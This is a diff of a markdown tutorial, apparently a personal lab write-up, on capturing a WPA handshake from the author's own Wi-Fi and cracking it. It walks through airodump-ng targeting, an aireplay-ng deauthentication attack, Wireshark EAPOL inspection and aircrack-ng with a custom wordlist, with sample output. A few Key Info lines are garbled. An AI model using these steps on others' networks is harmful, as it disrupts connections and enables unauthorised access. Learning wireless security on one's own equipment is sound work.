@@ -89,27 +89,26 @@ CH (Channel) → The Wi-Fi channel number it's broadcasting on: 11
 
 ESSID → The name of the network: Ankith
 ```
+
 🎯 STEP 5: Lock onto the target and capture the handshake
-bash
-Copy
-Edit
+```bash
 sudo airodump-ng -c 11 --bssid 3E:B7:E4:DD:3A:19 -w ankith_capture wlan0mon
+```
 This locks onto channel 11, focuses on Ankith, and saves handshake to ankith_capture-01.cap.
-
 Keep running until you see:
-
-bash
-Copy
-Edit
+```bash
 WPA handshake: 3E:B7:E4:DD:3A:19
-💥 Trigger the Handshake (Deauth Attack)
-If no client is connecting or the handshake is taking too long, we can force a device to reconnect by sending deauthentication packets.
+```
 
-bash
-Copy
-Edit
+### 💥 Trigger the Handshake (Deauth Attack)
+
+If no client is connecting or the handshake is taking too long, we can force a device to reconnect by sending deauthentication packets.
+```bash
 sudo aireplay-ng -0 5 -a 3E:B7:E4:DD:3A:19 wlan0mon
+```
+
 Explanation:
+```bash
 -0 → Deauth attack mode
 
 5 → Number of deauth packets
@@ -117,6 +116,7 @@ Explanation:
 -a → Target BSSID (router)
 
 wlan0mon → Monitor mode interface
+```
 
 This sends 5 deauthentication frames to all clients connected to Ankith.
 Those clients will disconnect and auto-reconnect, triggering a WPA handshake.
@@ -127,9 +127,7 @@ When the respective Wi-Fi appears on the phone, click on it.
 WPA handshake: 3E:B7:E4:DD:3A:19 will appear on your terminal.
 
 📋 Sample Output
-bash
-Copy
-Edit
+```bash
 CH 11 ][ Elapsed: 6 mins ][ 2025-07-05 03:40 ][ WPA handshake: 3E:B7:E4:DD:3A:19
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
@@ -137,17 +135,18 @@ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ES
 
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
 3E:B7:E4:DD:3A:19  50:8F:4C:A9:E0:6D  -45    1e- 1   16721    10638  EAPOL  Ankith
-🧾 STEP 7: Open and Visualize the Handshake in Wireshark
-bash
-Copy
-Edit
-wireshark ankith_capture-01.cap
-In Wireshark, apply this display filter:
 
-bash
-Copy
-Edit
+```
+
+🧾 STEP 7: Open and Visualize the Handshake in Wireshark
+```bash
+wireshark ankith_capture-01.cap
+```
+
+In Wireshark, apply this display filter:
+```bash
 eapol
+```
 You should see up to 4 packets:
 
 Message 1 of 4
@@ -161,46 +160,49 @@ Message 4 of 4
 Navigate to: IEEE 802.1X Authentication → Key Information
 
 Example Key Info Flags:
-bash
-Copy
-Edit
-Key Type: Pairwise Key  
-Key MIC: Set  
-Install: Set  
-Secure: Set  
+```bash
+KeyDescriPtor Versxon
+Key Type: Pairwise Key
+Key Index: @
+Install: Set	[IMP]
+Key ACK: set	[IMP]
+Key MIC: set	[IMP]
+Secure: Set
+Error: Not set
+Request: Not set
+Encrypted Key Data: Set
+SMK Message: Not set
+```
+
 🔢 Message Mapping Table:
 Message	Flags
+```bash
 1	Key ACK = 1, Key MIC = 0, Install = 0
 2	Key MIC = 1, ACK = 0, Install = 0
 3	MIC = 1, ACK = 1, Install = 1
 4	MIC = 1, ACK = 0, Install = 0 (again)
+```
 
 💡 You only need Message 2 to crack with Aircrack-ng.
 
 🔓 STEP 9: Crack the Handshake
 You’ll need a wordlist (dictionary of possible passwords).
-In this case, I suspected a few potential passwords and created a file including those.
+In this case, Since it was my own Wifi, I suspected a few potential passwords and created a file including those.
 
 📌 Create a Wordlist
-bash
-Copy
-Edit
+```bash
 echo -e "anki123456\nankith1234\nankith@2024\nAnkith123\nankithwifi\nankith321\nankith" > ankith_list.txt
+```
 🔨 Crack Command
-bash
-Copy
-Edit
+```bash
 aircrack-ng -w ankith_list.txt -b 3E:B7:E4:DD:3A:19 ankith_capture-01.cap
+```
 Or:
-
-bash
-Copy
-Edit
+```bash
 aircrack-ng -w ankith_list.txt -b 3E:B7:E4:DD:3A:19 ankith_capture-04.cap
+```
 🧾 Sample Output
-bash
-Copy
-Edit
+```bash
 Reading packets, please wait...
 Opening ankith_capture-04.cap
 Read 16951 packets.
@@ -224,4 +226,5 @@ Transient Key  : E9 53 84 18 E3 D9 3B 7E 54 F7 81 5E EE 28 87 75
                  3D 02 68 3A CF 12 46 83 EA A8 2B 4C 57 43 8A DB 
 
 EAPOL HMAC     : 81 C3 AD 1B 94 D1 CE C7 F6 6F 11 07 F1 0B CF 6D
+```
 ✅ The suspected passwords list helped crack the key successfully.
